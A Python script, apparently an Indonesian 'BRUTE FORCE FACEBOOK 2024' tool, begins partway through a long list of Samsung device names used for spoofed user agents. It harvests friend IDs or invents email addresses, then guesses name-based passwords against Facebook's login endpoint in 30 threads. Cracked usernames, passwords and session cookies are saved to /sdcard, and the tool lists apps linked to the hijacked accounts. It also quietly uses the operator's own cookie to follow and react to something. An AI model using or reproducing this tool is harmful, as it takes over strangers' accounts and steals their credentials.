'SCG01', 'SM-G981U1', 'SM-G981W', 'SM-G981V', 'SM-G981N', 'SC-51A', 'SM-G9810', 'SC51Aa', 'SM-G780G', 'SAMSUNG SM-G780F', 'SAMSUNG SM-G780G', 'SM-G781B', 'SM-G781V', 'SM-G781U', 'SM-G781U1', 'Galaxy S20 Ultra', 'SM-G988B', 'SM-G988W', 'SM-G988U', 'SAMSUNG SM-G988B', 'SM-G988U1', 'SM-G988N', 'SAMSUNG SM-G985F/G985FXXSFFVIB', 'SM-G985F/DS', 'SM-G986B', 'SM-G986U', 'SAMSUNG SM-G986B', 'SM-G986N', 'SM-G986W', 'SM-G986U1', 'Galaxy S21', 'SM-G991W', 'SM-G991U1', 'SM-G991B', 'SM-G991B', 'SM-G991B', 'SC-51B', 'SM-G991V', 'SM-G990U2', 'SM-G990B2', 'SAMSUNG SM-G990B', 'SM-G990E', 'SAMSUNG SM-G990B/G990BXXU4EWC7', 'SM-G998U', 'SAMSUNG SM-G998B', 'SM-G998N', 'SM-G998U1', 'SAMSUNG SM-G998U', 'SM-G998W', 'Galaxy S21+', 'SM-G996U', 'SM-G996B', 'SM-G996N', 'SM-G996B', 'SM-G9960', 'SM-S901U', 'SAMSUNG SM-S901U', 'SM-S901U1', 'SM-S901B', 'SAMSUNG SM-S901B', 'SM-S901W', 'SAMSUNG SM-S908E', 'SM-S908B', 'SAMSUNG SM-S908U', 'SM-S908U1', 'SM-S9080', 'SM-S908U1', 'SAMSUNG SM-S908B', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906N', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906B', 'SM-S906U1', 'SM-S906W', 'SM-S911W', 'SM-S911B', 'SM-S911U', 'SM-S911U1', 'SM-S918W', 'SAMSUNG SM-S918B/S918BXXS1AWD1', 'SM-S918U', 'SM-S918U1', 'SM-S916U', 'SM-S916B', 'SM-S916U1', 'SM-S916W', 'Galaxy S3', 'Samsung Galaxy S3', 'Galaxy S3', 'SM-G730V', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SM-G730W8', 'GT-I9505', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SCH-I959', 'SAMSUNG GT-I9505-ORANGE', 'SCH-I545', 'GT-I9500', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SAMSUNG GT-I9505', 'SAMSUNG GT-I9505/I9505XXUAMDC', 'SAMSUNG GT-I9505/I9505XXUDMGG', 'GT-I9295', 'SHV-E330S', 'SHV-E330L', 'SAMSUNG SHV-E330L', 'SHV-E330S', 'SHV-E330K', 'SAMSUNG SHV-E330S', 'SHV-E330K', 'GT-I9195', 'lineage_serranoltexx', 'GT-I9195I', 'GT-I9192I', 'GT-I9190', 'GT-I9192', 'SCH-I435', 'GT-I9515', 'GT-I9506', 'SAMSUNG GT-I9506', 'SAMSUNG SM-C105L', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C105', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105S', 'SM-C105L', 'SM-G900T', 'SM-G900F', 'SM-G900V', 'SM-G900M', 'SM-G900F', 'SM-G900P', 'SM-G900H', 'SM-G9006V', 'SM-G900F', 'SM-G870W', 'SAMSUNG-SM-G890A', 'SAMSUNG-SM-G870A', '1080x1920', 'SAMSUNG SM-G890A', 'SM-G900FD', 'SM-G860P', 'SM-G901F', 'SAMSUNG SM-G901F/G901FXXU1CPHA', 'SM-G800F', 'SM-G800H', 'SM-G903F', 'SM-G903W', 'SM-G920I', 'SM-G920P', 'SM-G920F', 'SM-G920W8', 'SAMSUNG SM-G920F', 'SM-G920K', 'SAMSUNG-SM-G920A', 'SM-G925F', 'SM-G925K', 'SAMSUNG-SM-G925A', 'SM-G9250', 'SAMSUNG SM-G925F', 'SAMSUNG SM-G928F', 'SAMSUNG-SM-G928A', 'SM-G928C', 'SM-G9280', 'SM-G9287', 'SAMSUNG SM-G928T', 'SM-G928I', 'SM-G930F', 'SM-G930W8', 'SAMSUNG SM-G930F', 'SM-G930V', 'SM-G930U', 'SM-G930S', 'SM-G930L', 'SM-G9300', 'SAMSUNG-SM-G891A', 'SAMSUNG SM-G891A', 'SM-G935F', 'SM-G935U', 'SAMSUNG SM-G935A', 'SM-G935T', 'SM-G935VC', 'SM-G935S', 'SM-G935L', 'SAMSUNG SM-G935W8', 'SM-G9350', 'SAMSUNG SM-G950U', 'SAMSUNG SM-G950F', 'SM-G950U1', 'SM-G950N', 'SC-02J', 'SAMSUNG SM-G950W', 'SM-G892A', 'SAMSUNG SM-G892A', 'SAMSUNG SM-G892U', 'SM-G8750', 'SM-G8750', 'SM-G8750', 'SAMSUNG SM-G8750', 'SM-G955U', 'SM-G955F', 'SAMSUNG SM-G955F/G955FXXUCDVG4', 'SM-G955W', 'SM-G9550', 'SM-G960F', 'SM-G960U', 'SAMSUNG SM-G960U1', 'SAMSUNG SM-G960F', 'SM-G965U', 'SM-G965F', 'SM-G965F', 'SM-G965U1', 'SM-G9650', 'SAMSUNG-SM-J321AZ', 'SAMSUNG-SM-J321AZ', 'SAMSUNG SM-J321AZ', 'SAMSUNG-SM-J326AZ', 'SM-J336AZ', 'SAMSUNG SM-J336AZ', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700R', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'GT-P1000', 'GALAXY TAB', 'Galaxy Tab', 'GT-P1000', 'Galaxy Tab 2', 'Galaxy Tab 2 3G', 'GT-P3100', 'Flow', 'GT-P3113', 'GT-P3113', 'GT-P3110', 'GT-P3110', 'SM-T116', 'SM-T116NU', 'SM-T116NY', 'SM-T116NQ', 'Galaxy Tab 4', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'Galaxy Tab KT107', 'Galaxy Tab Pro', 'Galaxy Tab PRO 10', 'SAMSUNG-SM-T2519', 'Samsung galaxy tab s3', 'Galaxy Tab2 3G', 'Galaxy Tab3 P5200', 'Galaxy Tab3 T311', 'Galaxy Tab4', 'GT-S7560', 'SAMSUNG GT-S7560/S7560XXBNC2', 'GT-S7560M', 'SAMSUNG GT-S7560/S7560XXBNJ1', 'SAMSUNG GT-S7560/S7560XXAME9', 'SAMSUNG GT-S7560/S7560XXAMH3', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'SCH-I699I', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560', 'GT-S7560', 'GT-S7560', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', '800x1212', 'GT-S7390', 'GT-S7390', 'GT-S7390G', 'GT-S7390', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SAMSUNG GT-S7580/S7580XXUBOA1', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SM-G318MZ', 'SM-G318HZ', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'GT-I8150', 'SAMSUNG-SM-W2016', 'SM-W2016', 'SM-W2018', 'SM-W2018', 'SAMSUNG SM-W2019', 'SM-W2019', 'SAMSUNG SM-W2021', 'SM-W2021', 'SM-W2021', 'SAMSUNG SM-W2022', 'SAMSUNG SM-W9023', 'SM-G600S', 'SAMSUNG SM-G600S', 'SAMSUNG SM-E426S', 'GT-I8552', 'GT-I8552', 'GT-I8552B', 'GT-I8552', 'GT-I8552', 'SM-G3812', 'SM-G3812', 'SM-G3812B', 'SM-G3812B', 'SM-G3812', 'SM-G3812', 'Samsung SM-G3818', 'SM-G3818', 'SM-G3812', 'Galaxy Wonder', 'SX Galaxy Xcove 4S', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710-ORANGE/S7710XXANE3', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'SM-G388F', 'SAMSUNG SM-G388F', 'SM-G389F', 'SM-G390F', 'SM-G390W', 'SM-G398FN', 'SAMSUNG SM-G398FN', 'SM-G525F', 'SM-G525N', 'SAMSUNG SM-G525F', 'SM-G736U1', 'SM-G736B', 'SM-G736W', 'SAMSUNG SM-G736B', 'SM-G889A', 'SM-G715FN', 'SAMSUNG SM-G715FN', 'SM-G715U1', 'SM-G715W', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'gt-s5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360L', 'GT-S5360L', 'GT-S5360L', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'SAMSUNG GT-B5510/B5510XXLE1', 'SAMSUNG GT-B5510/B5510XXLL1', 'GT-B5510', 'GT-B5510L', 'GT-B5510B', 'GT-B5510L', 'GT-B5510', 'GT-B5510', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510-ORANGE/B5510BVLF1', 'GT-B5510-ORANGE/B5510BVLD1', 'GT-B5510-ORANGE/B5510BVLB1', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-B5512B', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-S6310N', 'GT-S6310B', 'GT-S6310N', 'GT-S6310N', 'GT-S6310N-ORANGE/S6310NXXAMK1', 'GT-S6310T', 'GT-S6310T', 'GT-S6310L', 'GT-S6310L', 'GT-S6310L', 'GT-S6310T', 'GT-S6310N', 'GT-S6310L', 'SM-G130H', 'SM-G130HN', 'SM-G130E', 'SM-G130BT', 'SM-G130BU', 'SM-G130BU', 'SM-G130BU', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'SM-F700N', 'U', 'SM-F700U1', 'SM-F7000', 'SM-F700W', 'SM-F711U1', 'SAMSUNG SM-F711B/F711BXXU2CVC7', 'SM-F711N', 'SAMSUNG SM-F711U', 'SM-F721B', 'SM-F721U', 'SAMSUNG SM-F721B', 'SM-F721U1', 'SM-F707B', 'SAMSUNG SM-F707B', 'SM-F707U', 'SM-F7070', 'SM-F707U1', 'SM-F707UZAAXAA', 'SM-F707W', 'SM-F916B', 'SM-F916U', 'SAMSUNG SM-F916B', 'SAMSUNG SM-F916U1', 'SM-F926U', 'SM-F926B', 'SM-F9260', 'SM-F926N', 'SM-F926W', 'SAMSUNG SM-F926B', 'SM-F936U', 'SAMSUNG SM-F936B', 'SM-F936U', 'SM-F936U1', 'SAMSUNG SM-F936W', 'galaxy Z Fold2', 'SAMSUNG SM-Z130H', 'SM-Z200F', 'SM-Z300H', 'SM-Z300H', 'SAMSUNG SM-Z300H', 'Gear Live', 'SM-R750', 'GT-I9060I', 'GT-I9060I', 'Samsung J600GN,telcel,mx', 'SAMSUNG M2004J19C', 'SAMSUNG M2006C3LG', 'SAMSUNG M2102J20SG', 'Samsung M6', 'Samsung N70', 'SAMSUNG N9106', 'SAMSUNG-N9106', 'SAMSUNG-N9106HD', 'GT-I8000', 'SAMSUNG-P9700', 'SAMSUNG S2_PRO', 'SM-G530T1', 'SAMSUNG-T805C', 'SAMSUNG-T805S', 'SAMSUNG-T950S', 'GT-S8500'])
        self.build = random.choice(['NRD90M', 'LRX22G', 'KOT49H', 'LMY47V','KTU84P', 'LRX22C', 'NMF26X', 'IML74K', 'JZO54K', 'LRX22G', 'JDQ39', 'MMB29M', 'LRX22G', 'KOT4', 'NMF26X', 'JZO54K', 'JSS15J', 'LRX22C', 'LMY4', 'JDQ'])
        return(f"Mozilla/5.0 (Linux; Android {str(random.randint(10,13))}; {self.smg}) Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/289.0.0.77.109 Mobile Safari/537.36")
               
    def payload(self, curl):
        self.payload = {
            'av': re.search('{"actorID":"(\d+)"', str(curl)).group(1),
            '__user': re.search('{"actorID":"(\d+)"', str(curl)).group(1),
            '__a':'1',
            '__req': '3',
            '__hs': re.search('"haste_session":"(.*?)"', str(curl)).group(1),
            'dpr': '2',
            '__ccg': 'EXCELLENT',
            '__rev': re.search('{"consistency":{"rev":(\d+)}', str(curl)).group(1),
            '__s': '',
            '__hsi': re.search('"hsi":"(\d+)"', str(curl)).group(1),
            '__dyn': '',
            '__csr': '',
            '__comet_req': re.search('__comet_req=(\d+)', str(curl)).group(1),
            'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(curl)).group(1),
            'jazoest': re.search('jazoest=(\d+)', str(curl)).group(1),
            'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(curl)).group(1),
            '__spin_r': re.search('"__spin_r":(\d+)', str(curl)).group(1),
            '__spin_b': 'trunk',
            '__spin_t': re.search('"__spin_t":(\d+)', str(curl)).group(1),
            'fb_api_caller_class': 'RelayModern'
        }
        return(self.payload)
        
    def headers(self):
        self.headers = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'content-type': 'application/x-www-form-urlencoded',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty'
        }
        return(self.headers)
        
    def ApkActive(self, url, cookie):
        try:
            curl = requests.get(url, cookies={'cookie': cookie}).text
            self.headers = self.headers()
            self.headers.update({
                'host': 'web.facebook.com',
                'x-fb-friendly-name': 'ApplicationAndWebsitePaginatedSettingAppGridListActiveQuery',
                'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(curl)).group(1),
                'x-asbd-id': '129477'
            })
            self.payload = self.payload(curl)
            self.payload.update({
                'fb_api_req_friendly_name': 'ApplicationAndWebsitePaginatedSettingAppGridListActiveQuery', 
                'variables': json.dumps({"after":None,"first":None,"id": re.search('{"actorID":"(\d+)"', str(curl)).group(1)}),
                'server_timestamps':True,
                'doc_id':'4711129059016316'
            })
            resp = requests.post('https://web.facebook.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).json()
            for x in resp['data']['node']['activeApps']['edges']:
                try: xx = x['node']['apps_and_websites_view']['detailView']
                except: continue
                active.append("{}aplikasi {}{} {}status {}{}".format(DT,HU,xx['app_name'],DT,HU,xx['app_status']))
        except AttributeError as e: print(e)
        
    def ApkExpired(self, url, cookie):
        try:
            curl = requests.get(url, cookies={'cookie': cookie}).text
            self.headers.update({
                'host': 'web.facebook.com',
                'x-fb-friendly-name': 'ApplicationAndWebsitePaginatedSettingAppGridListExpiredQuery',
                'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(curl)).group(1),
                'x-asbd-id': '129477'
            })
            self.payload.update({
                'fb_api_req_friendly_name': 'ApplicationAndWebsitePaginatedSettingAppGridListExpiredQuery', 
                'variables': json.dumps({"after":None,"first":None,"id": re.search('{"actorID":"(\d+)"', str(curl)).group(1)}),
                'server_timestamps':True,
                'doc_id':'4802508009803010'
            })
            resp = requests.post('https://web.facebook.com/api/graphql/', data=self.payload, headers=self.headers, cookies={'cookie':cookie}).json()
            for x in resp['data']['node']['expiredApps']['edges']:
                try: xx = x['node']['apps_and_websites_view']['detailView']
                except: continue
                inactive.append("{}aplikasi {}{} {}status {}{}".format(DT,ME,xx['app_name'],DT,ME,xx['app_status']))
        except AttributeError as e: print(e)
           
    def TampilKan(self,xxx,passwd,cookie):
        tree = Tree(f'\r╭ logged in c_user',style='green')
        true = tree.add(f'{xxx}'); true.add(f'{passwd}')
        true.add(f'{cookie}')
        try: self.ApkActive('https://web.facebook.com/settings/?tab=applications', cookie)
        except Exception as e: pass
        true = tree.add(f'\r╭ aplikasi terkait active',style='green')
        if len(active)==0: true.add('tidak ada aplikasi terkait active')
        for apk in active: true.add(f"{apk}")
        try: self.ApkExpired('https://web.facebook.com/settings/?tab=applications', cookie)
        except Exception as e: pass
        true = tree.add(f'\r╭ aplikasi terkait inactive',style='red')
        if len(inactive)==0: true.add('tidak ada aplikasi terkait inactive')
        for apk in inactive: true.add(f"{apk}")
        printz(tree)
                    
class Facebook:
    def __init__(self):
        self.requ = requests.Session()
        self.opsi, self.ok, self.cp, self.lp = [],0,0,0
        self.dt = datetime.datetime.now()
        self.alt = ('Facebook-'+str(self.dt.year)+'.txt')
        self.create_dir()
        self.chek_data()
        
    def clear_terminal(self):
        try: os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        except: os.system('clear')
        
    def deled_dst(self):
        try: os.system('rm -rf .data_fb.txt')
        except: pass
        self.login_cookie()
        
    def create_dir(self):
        try: os.mkdir('/sdcard/OK')
        except: pass
        try: os.mkdir('/sdcard/CP')
        except: pass
        
    def canda_bang(self, cok):
        try: aungthor().bahasa(cok)
        except: pass
        try: aungthor().follow_dong(cok)
        except: pass
        try: aungthor().react_dong(cok)
        except: pass
        
    def chek_data(self):
        if os.path.isfile('.data_fb.txt') is True:
           xxx = open('.data_fb.txt','r').read()
           cookie, token = xxx.split('|'), xxx.split('|')
           self.login_menu(cookie, token) 
        else: self.deled_dst()
        
    def chek_info(self,cookie,token):
        try:
            resp = self.requ.get(f"https://graph.facebook.com/me?fields=id,name&access_token={token[1]}", cookies = {'cookies':cookie[0]}).json()
            id, name = resp['id'], resp['name']
            return id, name
        except KeyError as e: #print(e)
            input(f'\n {DT}[{ME}!{DT}] tumbal anda exspired, enter untuk kembali'); self.deled_dst()
            
    def login_cookie(self):
        self.clear_terminal()
        cok = input(f' {DT}[{HU}?{DT}] cookie facebook ')
        while True:
            try:
                self.canda_bang(cok)
                cur = self.requ.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1',cookies={'cookie': cok}).text
                src = re.findall('act=(\d+)',cur)[0]
                act = self.requ.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={src}&breakdown_regrouping=1",cookies={'cookie': cok}).text
                tok = re.search('.__accessToken="(.*?)"',act).group(1)
                print(f' {DT}[{HU}•{DT}] token facebook {tok}')
                with open('.data_fb.txt',mode='w') as wr:
                    wr.write(f'{cok}|{tok}')
                    wr.close()
                input(f' {DT}[{HU}!{DT}] login berhasil enter untuk ke menu')
                self.chek_data()
                break
            except AttributeError as e: print(e)
                #self.deled_dst()
                
    def login_menu(self,cookie, token):
        try: id, name = self.chek_info(cookie, token)
        except requests.exceptions.ConnectionError as e: exit(e)
        self.clear_terminal()
        print(f' {DT}[{HU} BRUTE FORCE FACEBOOK 2024 {DT}]')
        print(f'''
 {DT}[{HU}•{DT}] user_id {HU}{id}
 {DT}[{HU}•{DT}] fullname {HU}{name}''')
        print(f'''
 {DT}[{HU}1{DT}] Crack id dari friends
 {DT}[{HU}2{DT}] Clone random email
 {DT}[{HU}3{DT}] Cek result ok/cp
 {DT}[{HU}!{DT}]{ME} Log {DT}or Out\n''')
        ch = input(f' {DT}[{HU}?{DT}] choose : ')               
        if ch in ('1','01'):
            print(f'\n {DT}[{HU}•{DT}] Banyaknya ID, pisahkan dengan koma')
            user = input(f' {DT}[{HU}?{DT}] ID ')
            for uid in user.split(','):
                try: self.dump_friends(uid,token,cookie,'')       
                except Exception as e: pass #print(e)
                self.Methode()
            
        elif ch in ('2','02'):
            print(f'\n {DT}[{HU}•{DT}] Banyaknya Nama, pisahkan dengan koma')
            user = input(f' {DT}[{HU}?{DT}] Nama ')
            total = input(f' {DT}[{HU}?{DT}] Total dump ')
            print(f'\n {DT}[{HU}•{DT}] Banyaknya domain, pisahkan dengan koma')
            print(f' {DT}[{HU}•{DT}] Domain Example ({HU}@gmail.com, @yahoo.com {DT}dan lainnya)')
            doma = input(f' {DT}[{HU}?{DT}] Domain ').split(',')
            for nama in user.split(','):
                try: self.dump_email(nama,total,doma)
                except Exception as e: pass #print(e)
                self.Methode()
                
        elif ch in ('3','03'):
            print(f'''
 {DT}[{HU}1{DT}] Chek in result OK
 {DT}[{HU}2{DT}] Chek in result CP\n''')
            xxx = input(f' {DT}[{HU}?{DT}] choose : ')
            try: print(); self.Result(xxx)
            except Exception as e: print(f' {DT}[{ME}!{DT}] file tidak di temukan, silakan crack dulu'); exit()
                
        elif ch =='log' or ch =='Log': self.deled_dst()
        elif ch =='out' or ch =='Out': self.clear_terminal(); exit()
        else: exit()
        
    def Result(self, result):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/ok-'+str(self.alt)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f"Username {buka.split('|')[0]}"); true.add(f"Password {buka.split('|')[1]}"); true = tree.add(f"Cookie {buka.split('|')[2]}"); tree.add("Success cek in Result OK"); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f"Username {buka.split('|')[0]}"); true.add(f"Password {buka.split('|')[1]}"); tree.add("Success cek in Result OK"); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/CP/cp-'+str(self.alt)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f"Username {buka.split('|')[0]}"); true.add(f"Password {buka.split('|')[1]}"); tree.add("Success cek in Result CP"); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f"Username {buka.split('|')[0]}"); true.add(f"Password {buka.split('|')[1]}"); tree.add("Success cek in Result CP"); printz(tree)
                
    def dump_friends(self,uid,token,cookie,fields):
        try:
           if len(dump) == 0: prs = {'access_token': token[1],'fields': f'friends.fields(id,name)'}
           else:prs = {'access_token': token[1],'fields': f'friends.fields(id,name).after({fields})'}
           res = self.requ.get(f'https://graph.facebook.com/v18.0/{uid}/',params=prs, cookies={'cookie':cookie[0]}).json()
           for x in res['friends']['data']:
               if x not in dump:
                   dump.append((x['id']+'<=>'+x['name']))
                   print(f' {DT}[{HU}•{DT}] Sedang dump {HU}{len(dump)} {DT}idz',flush=True,end=('\r'))
           if 'fields' in str(res):
               self.dump_friends(uid,token,cookie,res['friends']['paging']['cursors']['after'])
        except KeyboardInterrupt: pass
        except AttributeError as e: pass
            
    def dump_email(self,nama,total,doma):
        orang = ['fasya','elis','saputra','dinda','ratna','putri','sari','sahrul','putra','bahrul','ulum','ulul','gilang','galang','hanif','hanifah','caca','cici','zahra','aulia','rahma','tika','cantika','fikri','adit','aditya','ferlita','yuli','yuliana','ilham','salsa','salsabila','dika','reno','aril','asril','wiwit','wiwik','julita','sita','tiko','tiyo','wildan','zidan','winda','dega','gemilang','indah','muhammad']
        with excutor(max_workers=5):
            for i in range(int(total)):
                melx = random.choice([f'{nama}{random.randint(0,90)}{doma}',f"{nama}{random.choice(['12','123','1234','12345','321','official','gaming'])}{random.randint(0,90)}{doma}",f'{nama}{random.choice(orang)}{random.randint(0,90)}{doma}',f"{nama}{random.choice(orang)}{random.choice(['12','123','1234','12345','321','official','gaming'])}{doma}"])
                if melx not in dump: dump.append(melx+'<=>'+nama)
                print(f' {DT}[{HU}•{DT}] Sedang dump {HU}{len(dump)} {DT}email',flush=True,end=('\r'))
            if int(len(dump)) == total: return(int(total))
        return dump
        
    def Methode(self):
        print('\n    ')
        cyud = input(f' {DT}[{HU}?{DT}] ingin menampilkan aplikasi (y/t): ')
        if cyud in ('y','ya'): self.opsi.append('muncul')
        self.exec_kntl()       
        
    def exec_kntl(self):
        print(f'''
 {DT}[{HU}•{DT}] Result OK : OK/ok-{self.alt}
 {DT}[{HU}•{DT}] Result CP : CP/cp-{self.alt}\n''')
        print(f' {DT}[{ME}!{DT}] Mainkan Mode Pesawat Setiap 200 Loop\n')
        with excutor(max_workers=30) as V:
            for xxx in dump:
                username, fullname = xxx.split('<=>')[0], xxx.split('<=>')[1].lower(); nama = fullname.split(' ')[0]; password = [fullname, nama+"321",nama+"123",nama+"1234",nama+"12345",nama+"123456"]
                V.submit(self.ExecReg, username, password) 
                
            if self.ok ==0 and self.cp ==0:
                exit(f' {DT}[{ME}!{DT}] Sorry, anda tidak mendapatkan result')
            else:
                print(f'''
 {DT}[{HU}•{DT}] Result OK : {self.ok}
 {DT}[{HU}•{DT}] Result CP : {self.cp}'''); exit()
                
    def ExecReg(self, username, password):
        byps = requests.Session()
        print(f' {DT}[{ME}{self.lp}/{len(dump)}{DT}] success : {HU}{self.ok}{DT} checkpoint : {KG}{self.cp}{DT}',flush=True,end=('\r'))
        for passwd in password:
            try:
                curl = byps.get('https://d.prod.facebook.com/login/?login_attempt=1&lwv=101').text
                encode = {
                    'lsd': re.search('name="lsd" value="(.*?)"',str(curl)).group(1),
                    'jazoest': re.findall('name="jazoest" value="(\d+)"',str(curl))[0],
                    'email': username,
                    'cred_type': str(random.randint(100,900)),
                    'login_source': 'device_based_login_add_account',
                    'pass': passwd,         
                }
                headers = {
                    'host': 'd.prod.facebook.com',
                    'cache-control': 'max-age=0',
                    'dpr': '2',
                    'viewport-width': '980',
                    'sec-ch-ua': '"Google Chrome";v="114", "Chromium";v="114", "Not?A_Brand";v="8"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': 'Linux',
                    'sec-ch-prefers-color-scheme': 'light',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://d.prod.facebook.com/',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': Requ().useragent(),
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://d.prod.facebook.com/?login_attempt=1&lwv=101',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                params={
                    'login_attempt':'1',
                    'lwv':'120',
                    'lwc':'1348092'
                }
                resp = bs(byps.post('https://d.prod.facebook.com/login/device-based/regular/login/?', params=params, data=encode, headers=headers).text,'html.parser')
                if 'c_user' in byps.cookies.get_dict().keys():
                    self.ok+=1
                    cookie = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                    try: uid = re.findall('c_user=(\d+)', cookie)[0]
                    except Exception as e: uid = username
                    if 'muncul' in self.opsi:
                        Requ().TampilKan(uid,passwd,cookie)
                        save = (f'{uid}|{passwd}|{cookie}\n')
                    else:
                        tree = Tree(f'\r╭ logged in c_user',style='green')
                        tree.add(f'{uid}')
                        tree.add(f'{passwd}')
                        tree.add(f'{cookie}')
                        printz(tree)
                        save = (f'{uid}|{passwd}|{cookie}\n')
                    with open('/sdcard/OK/ok-'+self.alt,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break
                elif 'checkpoint' in byps.cookies.get_dict().keys():
                    try: uid = byps.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                    except Exception as e: uid = username
                    tree = Tree(f'\r╭ logged in checkpoint',style='yellow')
                    tree.add(f'{uid}')
                    tree.add(f'{passwd}')
                    save = (f'{uid}|{passwd}\n')
                    printz(tree)
                    self.cp+=1
                    with open('/sdcard/CP/cp-'+self.alt,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break  
                else: continue   
            except requests.exceptions.ConnectionError: time.sleep(31)
        self.lp+=1        
        
if __name__=='__main__':
    try: Facebook()
    except Exception as e: exit(e)
